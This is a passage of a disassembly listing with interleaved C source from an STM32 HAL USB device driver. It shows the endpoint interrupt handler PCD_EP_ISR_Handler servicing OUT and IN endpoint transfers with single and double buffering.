 8002816:	8a7b      	ldrh	r3, [r7, #18]
 8002818:	f483 5300 	eor.w	r3, r3, #8192	; 0x2000
 800281c:	827b      	strh	r3, [r7, #18]
 800281e:	687b      	ldr	r3, [r7, #4]
 8002820:	681a      	ldr	r2, [r3, #0]
 8002822:	8a7b      	ldrh	r3, [r7, #18]
 8002824:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002828:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800282c:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 8002830:	f043 0380 	orr.w	r3, r3, #128	; 0x80
 8002834:	b29b      	uxth	r3, r3
 8002836:	8013      	strh	r3, [r2, #0]
 8002838:	e22c      	b.n	8002c94 <PCD_EP_ISR_Handler+0x76e>
    }
    else
    {
      /* Decode and service non control endpoints interrupt */
      /* process related endpoint register */
      wEPVal = PCD_GET_ENDPOINT(hpcd->Instance, epindex);
 800283a:	687b      	ldr	r3, [r7, #4]
 800283c:	681b      	ldr	r3, [r3, #0]
 800283e:	461a      	mov	r2, r3
 8002840:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002844:	009b      	lsls	r3, r3, #2
 8002846:	4413      	add	r3, r2
 8002848:	881b      	ldrh	r3, [r3, #0]
 800284a:	f8a7 304a 	strh.w	r3, [r7, #74]	; 0x4a

      if ((wEPVal & USB_EP_CTR_RX) != 0U)
 800284e:	f9b7 304a 	ldrsh.w	r3, [r7, #74]	; 0x4a
 8002852:	2b00      	cmp	r3, #0
 8002854:	f280 80f6 	bge.w	8002a44 <PCD_EP_ISR_Handler+0x51e>
      {
        /* clear int flag */
        PCD_CLEAR_RX_EP_CTR(hpcd->Instance, epindex);
 8002858:	687b      	ldr	r3, [r7, #4]
 800285a:	681b      	ldr	r3, [r3, #0]
 800285c:	461a      	mov	r2, r3
 800285e:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002862:	009b      	lsls	r3, r3, #2
 8002864:	4413      	add	r3, r2
 8002866:	881b      	ldrh	r3, [r3, #0]
 8002868:	b29a      	uxth	r2, r3
 800286a:	f640 738f 	movw	r3, #3983	; 0xf8f
 800286e:	4013      	ands	r3, r2
 8002870:	f8a7 3048 	strh.w	r3, [r7, #72]	; 0x48
 8002874:	687b      	ldr	r3, [r7, #4]
 8002876:	681b      	ldr	r3, [r3, #0]
 8002878:	461a      	mov	r2, r3
 800287a:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 800287e:	009b      	lsls	r3, r3, #2
 8002880:	4413      	add	r3, r2
 8002882:	f8b7 2048 	ldrh.w	r2, [r7, #72]	; 0x48
 8002886:	f042 0280 	orr.w	r2, r2, #128	; 0x80
 800288a:	b292      	uxth	r2, r2
 800288c:	801a      	strh	r2, [r3, #0]
        ep = &hpcd->OUT_ep[epindex];
 800288e:	f897 204d 	ldrb.w	r2, [r7, #77]	; 0x4d
 8002892:	4613      	mov	r3, r2
 8002894:	009b      	lsls	r3, r3, #2
 8002896:	4413      	add	r3, r2
 8002898:	00db      	lsls	r3, r3, #3
 800289a:	f503 73b4 	add.w	r3, r3, #360	; 0x168
 800289e:	687a      	ldr	r2, [r7, #4]
 80028a0:	4413      	add	r3, r2
 80028a2:	657b      	str	r3, [r7, #84]	; 0x54

        /* OUT Single Buffering */
        if (ep->doublebuffer == 0U)
 80028a4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028a6:	7b1b      	ldrb	r3, [r3, #12]
 80028a8:	2b00      	cmp	r3, #0
 80028aa:	d123      	bne.n	80028f4 <PCD_EP_ISR_Handler+0x3ce>
        {
          count = (uint16_t)PCD_GET_EP_RX_CNT(hpcd->Instance, ep->num);
 80028ac:	687b      	ldr	r3, [r7, #4]
 80028ae:	681b      	ldr	r3, [r3, #0]
 80028b0:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80028b4:	b29b      	uxth	r3, r3
 80028b6:	461a      	mov	r2, r3
 80028b8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028ba:	781b      	ldrb	r3, [r3, #0]
 80028bc:	00db      	lsls	r3, r3, #3
 80028be:	4413      	add	r3, r2
 80028c0:	687a      	ldr	r2, [r7, #4]
 80028c2:	6812      	ldr	r2, [r2, #0]
 80028c4:	4413      	add	r3, r2
 80028c6:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80028ca:	881b      	ldrh	r3, [r3, #0]
 80028cc:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80028d0:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

          if (count != 0U)
 80028d4:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 80028d8:	2b00      	cmp	r3, #0
 80028da:	f000 808e 	beq.w	80029fa <PCD_EP_ISR_Handler+0x4d4>
          {
            USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaadress, count);
 80028de:	687b      	ldr	r3, [r7, #4]
 80028e0:	6818      	ldr	r0, [r3, #0]
 80028e2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028e4:	6959      	ldr	r1, [r3, #20]
 80028e6:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028e8:	88da      	ldrh	r2, [r3, #6]
 80028ea:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 80028ee:	f005 fdda 	bl	80084a6 <USB_ReadPMA>
 80028f2:	e082      	b.n	80029fa <PCD_EP_ISR_Handler+0x4d4>
        }
#if (USE_USB_DOUBLE_BUFFER == 1U)
        else
        {
          /* manage double buffer bulk out */
          if (ep->type == EP_TYPE_BULK)
 80028f4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80028f6:	78db      	ldrb	r3, [r3, #3]
 80028f8:	2b02      	cmp	r3, #2
 80028fa:	d10a      	bne.n	8002912 <PCD_EP_ISR_Handler+0x3ec>
          {
            count = HAL_PCD_EP_DB_Receive(hpcd, ep, wEPVal);
 80028fc:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002900:	461a      	mov	r2, r3
 8002902:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002904:	6878      	ldr	r0, [r7, #4]
 8002906:	f000 f9d3 	bl	8002cb0 <HAL_PCD_EP_DB_Receive>
 800290a:	4603      	mov	r3, r0
 800290c:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50
 8002910:	e073      	b.n	80029fa <PCD_EP_ISR_Handler+0x4d4>
          }
          else /* manage double buffer iso out */
          {
            /* free EP OUT Buffer */
            PCD_FREE_USER_BUFFER(hpcd->Instance, ep->num, 0U);
 8002912:	687b      	ldr	r3, [r7, #4]
 8002914:	681b      	ldr	r3, [r3, #0]
 8002916:	461a      	mov	r2, r3
 8002918:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800291a:	781b      	ldrb	r3, [r3, #0]
 800291c:	009b      	lsls	r3, r3, #2
 800291e:	4413      	add	r3, r2
 8002920:	881b      	ldrh	r3, [r3, #0]
 8002922:	b29b      	uxth	r3, r3
 8002924:	f423 43e0 	bic.w	r3, r3, #28672	; 0x7000
 8002928:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 800292c:	f8a7 3052 	strh.w	r3, [r7, #82]	; 0x52
 8002930:	687b      	ldr	r3, [r7, #4]
 8002932:	681b      	ldr	r3, [r3, #0]
 8002934:	461a      	mov	r2, r3
 8002936:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002938:	781b      	ldrb	r3, [r3, #0]
 800293a:	009b      	lsls	r3, r3, #2
 800293c:	441a      	add	r2, r3
 800293e:	f8b7 3052 	ldrh.w	r3, [r7, #82]	; 0x52
 8002942:	f043 437f 	orr.w	r3, r3, #4278190080	; 0xff000000
 8002946:	f443 037f 	orr.w	r3, r3, #16711680	; 0xff0000
 800294a:	f443 4300 	orr.w	r3, r3, #32768	; 0x8000
 800294e:	f043 03c0 	orr.w	r3, r3, #192	; 0xc0
 8002952:	b29b      	uxth	r3, r3
 8002954:	8013      	strh	r3, [r2, #0]

            if ((PCD_GET_ENDPOINT(hpcd->Instance, ep->num) & USB_EP_DTOG_RX) != 0U)
 8002956:	687b      	ldr	r3, [r7, #4]
 8002958:	681b      	ldr	r3, [r3, #0]
 800295a:	461a      	mov	r2, r3
 800295c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800295e:	781b      	ldrb	r3, [r3, #0]
 8002960:	009b      	lsls	r3, r3, #2
 8002962:	4413      	add	r3, r2
 8002964:	881b      	ldrh	r3, [r3, #0]
 8002966:	b29b      	uxth	r3, r3
 8002968:	f403 4380 	and.w	r3, r3, #16384	; 0x4000
 800296c:	2b00      	cmp	r3, #0
 800296e:	d022      	beq.n	80029b6 <PCD_EP_ISR_Handler+0x490>
            {
              /* read from endpoint BUF0Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF0_CNT(hpcd->Instance, ep->num);
 8002970:	687b      	ldr	r3, [r7, #4]
 8002972:	681b      	ldr	r3, [r3, #0]
 8002974:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002978:	b29b      	uxth	r3, r3
 800297a:	461a      	mov	r2, r3
 800297c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 800297e:	781b      	ldrb	r3, [r3, #0]
 8002980:	00db      	lsls	r3, r3, #3
 8002982:	4413      	add	r3, r2
 8002984:	687a      	ldr	r2, [r7, #4]
 8002986:	6812      	ldr	r2, [r2, #0]
 8002988:	4413      	add	r3, r2
 800298a:	f203 4302 	addw	r3, r3, #1026	; 0x402
 800298e:	881b      	ldrh	r3, [r3, #0]
 8002990:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002994:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 8002998:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 800299c:	2b00      	cmp	r3, #0
 800299e:	d02c      	beq.n	80029fa <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr0, count);
 80029a0:	687b      	ldr	r3, [r7, #4]
 80029a2:	6818      	ldr	r0, [r3, #0]
 80029a4:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029a6:	6959      	ldr	r1, [r3, #20]
 80029a8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029aa:	891a      	ldrh	r2, [r3, #8]
 80029ac:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 80029b0:	f005 fd79 	bl	80084a6 <USB_ReadPMA>
 80029b4:	e021      	b.n	80029fa <PCD_EP_ISR_Handler+0x4d4>
              }
            }
            else
            {
              /* read from endpoint BUF1Addr buffer */
              count = (uint16_t)PCD_GET_EP_DBUF1_CNT(hpcd->Instance, ep->num);
 80029b6:	687b      	ldr	r3, [r7, #4]
 80029b8:	681b      	ldr	r3, [r3, #0]
 80029ba:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 80029be:	b29b      	uxth	r3, r3
 80029c0:	461a      	mov	r2, r3
 80029c2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029c4:	781b      	ldrb	r3, [r3, #0]
 80029c6:	00db      	lsls	r3, r3, #3
 80029c8:	4413      	add	r3, r2
 80029ca:	687a      	ldr	r2, [r7, #4]
 80029cc:	6812      	ldr	r2, [r2, #0]
 80029ce:	4413      	add	r3, r2
 80029d0:	f203 4306 	addw	r3, r3, #1030	; 0x406
 80029d4:	881b      	ldrh	r3, [r3, #0]
 80029d6:	f3c3 0309 	ubfx	r3, r3, #0, #10
 80029da:	f8a7 3050 	strh.w	r3, [r7, #80]	; 0x50

              if (count != 0U)
 80029de:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 80029e2:	2b00      	cmp	r3, #0
 80029e4:	d009      	beq.n	80029fa <PCD_EP_ISR_Handler+0x4d4>
              {
                USB_ReadPMA(hpcd->Instance, ep->xfer_buff, ep->pmaaddr1, count);
 80029e6:	687b      	ldr	r3, [r7, #4]
 80029e8:	6818      	ldr	r0, [r3, #0]
 80029ea:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029ec:	6959      	ldr	r1, [r3, #20]
 80029ee:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029f0:	895a      	ldrh	r2, [r3, #10]
 80029f2:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 80029f6:	f005 fd56 	bl	80084a6 <USB_ReadPMA>
          }
        }
#endif /* (USE_USB_DOUBLE_BUFFER == 1U) */

        /* multi-packet on the NON control OUT endpoint */
        ep->xfer_count += count;
 80029fa:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 80029fc:	69da      	ldr	r2, [r3, #28]
 80029fe:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a02:	441a      	add	r2, r3
 8002a04:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a06:	61da      	str	r2, [r3, #28]
        ep->xfer_buff += count;
 8002a08:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a0a:	695a      	ldr	r2, [r3, #20]
 8002a0c:	f8b7 3050 	ldrh.w	r3, [r7, #80]	; 0x50
 8002a10:	441a      	add	r2, r3
 8002a12:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a14:	615a      	str	r2, [r3, #20]

        if ((ep->xfer_len == 0U) || (count < ep->maxpacket))
 8002a16:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a18:	699b      	ldr	r3, [r3, #24]
 8002a1a:	2b00      	cmp	r3, #0
 8002a1c:	d005      	beq.n	8002a2a <PCD_EP_ISR_Handler+0x504>
 8002a1e:	f8b7 2050 	ldrh.w	r2, [r7, #80]	; 0x50
 8002a22:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a24:	691b      	ldr	r3, [r3, #16]
 8002a26:	429a      	cmp	r2, r3
 8002a28:	d206      	bcs.n	8002a38 <PCD_EP_ISR_Handler+0x512>
        {
          /* RX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataOutStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataOutStageCallback(hpcd, ep->num);
 8002a2a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002a2c:	781b      	ldrb	r3, [r3, #0]
 8002a2e:	4619      	mov	r1, r3
 8002a30:	6878      	ldr	r0, [r7, #4]
 8002a32:	f009 ff3d 	bl	800c8b0 <HAL_PCD_DataOutStageCallback>
 8002a36:	e005      	b.n	8002a44 <PCD_EP_ISR_Handler+0x51e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          (void)USB_EPStartXfer(hpcd->Instance, ep);
 8002a38:	687b      	ldr	r3, [r7, #4]
 8002a3a:	681b      	ldr	r3, [r3, #0]
 8002a3c:	6d79      	ldr	r1, [r7, #84]	; 0x54
 8002a3e:	4618      	mov	r0, r3
 8002a40:	f003 ffe3 	bl	8006a0a <USB_EPStartXfer>
        }
      }

      if ((wEPVal & USB_EP_CTR_TX) != 0U)
 8002a44:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002a48:	f003 0380 	and.w	r3, r3, #128	; 0x80
 8002a4c:	2b00      	cmp	r3, #0
 8002a4e:	f000 8121 	beq.w	8002c94 <PCD_EP_ISR_Handler+0x76e>
      {
        ep = &hpcd->IN_ep[epindex];
 8002a52:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002a56:	1c5a      	adds	r2, r3, #1
 8002a58:	4613      	mov	r3, r2
 8002a5a:	009b      	lsls	r3, r3, #2
 8002a5c:	4413      	add	r3, r2
 8002a5e:	00db      	lsls	r3, r3, #3
 8002a60:	687a      	ldr	r2, [r7, #4]
 8002a62:	4413      	add	r3, r2
 8002a64:	657b      	str	r3, [r7, #84]	; 0x54

        /* clear int flag */
        PCD_CLEAR_TX_EP_CTR(hpcd->Instance, epindex);
 8002a66:	687b      	ldr	r3, [r7, #4]
 8002a68:	681b      	ldr	r3, [r3, #0]
 8002a6a:	461a      	mov	r2, r3
 8002a6c:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002a70:	009b      	lsls	r3, r3, #2
 8002a72:	4413      	add	r3, r2
 8002a74:	881b      	ldrh	r3, [r3, #0]
 8002a76:	b29b      	uxth	r3, r3
 8002a78:	f423 43e1 	bic.w	r3, r3, #28800	; 0x7080
 8002a7c:	f023 0370 	bic.w	r3, r3, #112	; 0x70
 8002a80:	f8a7 3042 	strh.w	r3, [r7, #66]	; 0x42
 8002a84:	687b      	ldr	r3, [r7, #4]
 8002a86:	681b      	ldr	r3, [r3, #0]
 8002a88:	461a      	mov	r2, r3
 8002a8a:	f897 304d 	ldrb.w	r3, [r7, #77]	; 0x4d
 8002a8e:	009b      	lsls	r3, r3, #2
 8002a90:	441a      	add	r2, r3
 8002a92:	f8b7 3042 	ldrh.w	r3, [r7, #66]	; 0x42
 8002a96:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002a9a:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002a9e:	b29b      	uxth	r3, r3
 8002aa0:	8013      	strh	r3, [r2, #0]

        if (ep->type == EP_TYPE_ISOC)
 8002aa2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002aa4:	78db      	ldrb	r3, [r3, #3]
 8002aa6:	2b01      	cmp	r3, #1
 8002aa8:	f040 80a2 	bne.w	8002bf0 <PCD_EP_ISR_Handler+0x6ca>
        {
          ep->xfer_len = 0U;
 8002aac:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002aae:	2200      	movs	r2, #0
 8002ab0:	619a      	str	r2, [r3, #24]

#if (USE_USB_DOUBLE_BUFFER == 1U)
          if (ep->doublebuffer != 0U)
 8002ab2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002ab4:	7b1b      	ldrb	r3, [r3, #12]
 8002ab6:	2b00      	cmp	r3, #0
 8002ab8:	f000 8093 	beq.w	8002be2 <PCD_EP_ISR_Handler+0x6bc>
          {
            if ((wEPVal & USB_EP_DTOG_TX) != 0U)
 8002abc:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002ac0:	f003 0340 	and.w	r3, r3, #64	; 0x40
 8002ac4:	2b00      	cmp	r3, #0
 8002ac6:	d046      	beq.n	8002b56 <PCD_EP_ISR_Handler+0x630>
            {
              PCD_SET_EP_DBUF0_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002ac8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002aca:	785b      	ldrb	r3, [r3, #1]
 8002acc:	2b00      	cmp	r3, #0
 8002ace:	d126      	bne.n	8002b1e <PCD_EP_ISR_Handler+0x5f8>
 8002ad0:	687b      	ldr	r3, [r7, #4]
 8002ad2:	681b      	ldr	r3, [r3, #0]
 8002ad4:	627b      	str	r3, [r7, #36]	; 0x24
 8002ad6:	687b      	ldr	r3, [r7, #4]
 8002ad8:	681b      	ldr	r3, [r3, #0]
 8002ada:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002ade:	b29b      	uxth	r3, r3
 8002ae0:	461a      	mov	r2, r3
 8002ae2:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002ae4:	4413      	add	r3, r2
 8002ae6:	627b      	str	r3, [r7, #36]	; 0x24
 8002ae8:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002aea:	781b      	ldrb	r3, [r3, #0]
 8002aec:	00da      	lsls	r2, r3, #3
 8002aee:	6a7b      	ldr	r3, [r7, #36]	; 0x24
 8002af0:	4413      	add	r3, r2
 8002af2:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002af6:	623b      	str	r3, [r7, #32]
 8002af8:	6a3b      	ldr	r3, [r7, #32]
 8002afa:	881b      	ldrh	r3, [r3, #0]
 8002afc:	b29b      	uxth	r3, r3
 8002afe:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002b02:	b29a      	uxth	r2, r3
 8002b04:	6a3b      	ldr	r3, [r7, #32]
 8002b06:	801a      	strh	r2, [r3, #0]
 8002b08:	6a3b      	ldr	r3, [r7, #32]
 8002b0a:	881b      	ldrh	r3, [r3, #0]
 8002b0c:	b29b      	uxth	r3, r3
 8002b0e:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002b12:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002b16:	b29a      	uxth	r2, r3
 8002b18:	6a3b      	ldr	r3, [r7, #32]
 8002b1a:	801a      	strh	r2, [r3, #0]
 8002b1c:	e061      	b.n	8002be2 <PCD_EP_ISR_Handler+0x6bc>
 8002b1e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b20:	785b      	ldrb	r3, [r3, #1]
 8002b22:	2b01      	cmp	r3, #1
 8002b24:	d15d      	bne.n	8002be2 <PCD_EP_ISR_Handler+0x6bc>
 8002b26:	687b      	ldr	r3, [r7, #4]
 8002b28:	681b      	ldr	r3, [r3, #0]
 8002b2a:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002b2c:	687b      	ldr	r3, [r7, #4]
 8002b2e:	681b      	ldr	r3, [r3, #0]
 8002b30:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002b34:	b29b      	uxth	r3, r3
 8002b36:	461a      	mov	r2, r3
 8002b38:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002b3a:	4413      	add	r3, r2
 8002b3c:	62fb      	str	r3, [r7, #44]	; 0x2c
 8002b3e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b40:	781b      	ldrb	r3, [r3, #0]
 8002b42:	00da      	lsls	r2, r3, #3
 8002b44:	6afb      	ldr	r3, [r7, #44]	; 0x2c
 8002b46:	4413      	add	r3, r2
 8002b48:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002b4c:	62bb      	str	r3, [r7, #40]	; 0x28
 8002b4e:	6abb      	ldr	r3, [r7, #40]	; 0x28
 8002b50:	2200      	movs	r2, #0
 8002b52:	801a      	strh	r2, [r3, #0]
 8002b54:	e045      	b.n	8002be2 <PCD_EP_ISR_Handler+0x6bc>
            }
            else
            {
              PCD_SET_EP_DBUF1_CNT(hpcd->Instance, ep->num, ep->is_in, 0U);
 8002b56:	687b      	ldr	r3, [r7, #4]
 8002b58:	681b      	ldr	r3, [r3, #0]
 8002b5a:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002b5c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b5e:	785b      	ldrb	r3, [r3, #1]
 8002b60:	2b00      	cmp	r3, #0
 8002b62:	d126      	bne.n	8002bb2 <PCD_EP_ISR_Handler+0x68c>
 8002b64:	687b      	ldr	r3, [r7, #4]
 8002b66:	681b      	ldr	r3, [r3, #0]
 8002b68:	637b      	str	r3, [r7, #52]	; 0x34
 8002b6a:	687b      	ldr	r3, [r7, #4]
 8002b6c:	681b      	ldr	r3, [r3, #0]
 8002b6e:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002b72:	b29b      	uxth	r3, r3
 8002b74:	461a      	mov	r2, r3
 8002b76:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002b78:	4413      	add	r3, r2
 8002b7a:	637b      	str	r3, [r7, #52]	; 0x34
 8002b7c:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002b7e:	781b      	ldrb	r3, [r3, #0]
 8002b80:	00da      	lsls	r2, r3, #3
 8002b82:	6b7b      	ldr	r3, [r7, #52]	; 0x34
 8002b84:	4413      	add	r3, r2
 8002b86:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002b8a:	633b      	str	r3, [r7, #48]	; 0x30
 8002b8c:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002b8e:	881b      	ldrh	r3, [r3, #0]
 8002b90:	b29b      	uxth	r3, r3
 8002b92:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002b96:	b29a      	uxth	r2, r3
 8002b98:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002b9a:	801a      	strh	r2, [r3, #0]
 8002b9c:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002b9e:	881b      	ldrh	r3, [r3, #0]
 8002ba0:	b29b      	uxth	r3, r3
 8002ba2:	ea6f 4343 	mvn.w	r3, r3, lsl #17
 8002ba6:	ea6f 4353 	mvn.w	r3, r3, lsr #17
 8002baa:	b29a      	uxth	r2, r3
 8002bac:	6b3b      	ldr	r3, [r7, #48]	; 0x30
 8002bae:	801a      	strh	r2, [r3, #0]
 8002bb0:	e017      	b.n	8002be2 <PCD_EP_ISR_Handler+0x6bc>
 8002bb2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bb4:	785b      	ldrb	r3, [r3, #1]
 8002bb6:	2b01      	cmp	r3, #1
 8002bb8:	d113      	bne.n	8002be2 <PCD_EP_ISR_Handler+0x6bc>
 8002bba:	687b      	ldr	r3, [r7, #4]
 8002bbc:	681b      	ldr	r3, [r3, #0]
 8002bbe:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002bc2:	b29b      	uxth	r3, r3
 8002bc4:	461a      	mov	r2, r3
 8002bc6:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002bc8:	4413      	add	r3, r2
 8002bca:	63fb      	str	r3, [r7, #60]	; 0x3c
 8002bcc:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002bce:	781b      	ldrb	r3, [r3, #0]
 8002bd0:	00da      	lsls	r2, r3, #3
 8002bd2:	6bfb      	ldr	r3, [r7, #60]	; 0x3c
 8002bd4:	4413      	add	r3, r2
 8002bd6:	f203 4306 	addw	r3, r3, #1030	; 0x406
 8002bda:	63bb      	str	r3, [r7, #56]	; 0x38
 8002bdc:	6bbb      	ldr	r3, [r7, #56]	; 0x38
 8002bde:	2200      	movs	r2, #0
 8002be0:	801a      	strh	r2, [r3, #0]

          /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
          hpcd->DataInStageCallback(hpcd, ep->num);
#else
          HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002be2:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002be4:	781b      	ldrb	r3, [r3, #0]
 8002be6:	4619      	mov	r1, r3
 8002be8:	6878      	ldr	r0, [r7, #4]
 8002bea:	f009 fe7c 	bl	800c8e6 <HAL_PCD_DataInStageCallback>
 8002bee:	e051      	b.n	8002c94 <PCD_EP_ISR_Handler+0x76e>
#endif /* USE_HAL_PCD_REGISTER_CALLBACKS */
        }
        else
        {
          /* Manage Single Buffer Transaction */
          if ((wEPVal & USB_EP_KIND) == 0U)
 8002bf0:	f8b7 304a 	ldrh.w	r3, [r7, #74]	; 0x4a
 8002bf4:	f403 7380 	and.w	r3, r3, #256	; 0x100
 8002bf8:	2b00      	cmp	r3, #0
 8002bfa:	d144      	bne.n	8002c86 <PCD_EP_ISR_Handler+0x760>
          {
            /* multi-packet on the NON control IN endpoint */
            TxPctSize = (uint16_t)PCD_GET_EP_TX_CNT(hpcd->Instance, ep->num);
 8002bfc:	687b      	ldr	r3, [r7, #4]
 8002bfe:	681b      	ldr	r3, [r3, #0]
 8002c00:	f8b3 3050 	ldrh.w	r3, [r3, #80]	; 0x50
 8002c04:	b29b      	uxth	r3, r3
 8002c06:	461a      	mov	r2, r3
 8002c08:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c0a:	781b      	ldrb	r3, [r3, #0]
 8002c0c:	00db      	lsls	r3, r3, #3
 8002c0e:	4413      	add	r3, r2
 8002c10:	687a      	ldr	r2, [r7, #4]
 8002c12:	6812      	ldr	r2, [r2, #0]
 8002c14:	4413      	add	r3, r2
 8002c16:	f203 4302 	addw	r3, r3, #1026	; 0x402
 8002c1a:	881b      	ldrh	r3, [r3, #0]
 8002c1c:	f3c3 0309 	ubfx	r3, r3, #0, #10
 8002c20:	f8a7 3040 	strh.w	r3, [r7, #64]	; 0x40

            if (ep->xfer_len > TxPctSize)
 8002c24:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c26:	699a      	ldr	r2, [r3, #24]
 8002c28:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002c2c:	429a      	cmp	r2, r3
 8002c2e:	d907      	bls.n	8002c40 <PCD_EP_ISR_Handler+0x71a>
            {
              ep->xfer_len -= TxPctSize;
 8002c30:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c32:	699a      	ldr	r2, [r3, #24]
 8002c34:	f8b7 3040 	ldrh.w	r3, [r7, #64]	; 0x40
 8002c38:	1ad2      	subs	r2, r2, r3
 8002c3a:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c3c:	619a      	str	r2, [r3, #24]
 8002c3e:	e002      	b.n	8002c46 <PCD_EP_ISR_Handler+0x720>
            }
            else
            {
              ep->xfer_len = 0U;
 8002c40:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c42:	2200      	movs	r2, #0
 8002c44:	619a      	str	r2, [r3, #24]
            }

            /* Zero Length Packet? */
            if (ep->xfer_len == 0U)
 8002c46:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c48:	699b      	ldr	r3, [r3, #24]
 8002c4a:	2b00      	cmp	r3, #0
 8002c4c:	d106      	bne.n	8002c5c <PCD_EP_ISR_Handler+0x736>
            {
              /* TX COMPLETE */
#if (USE_HAL_PCD_REGISTER_CALLBACKS == 1U)
              hpcd->DataInStageCallback(hpcd, ep->num);
#else
              HAL_PCD_DataInStageCallback(hpcd, ep->num);
 8002c4e:	6d7b      	ldr	r3, [r7, #84]	; 0x54
 8002c50:	781b      	ldrb	r3, [r3, #0]
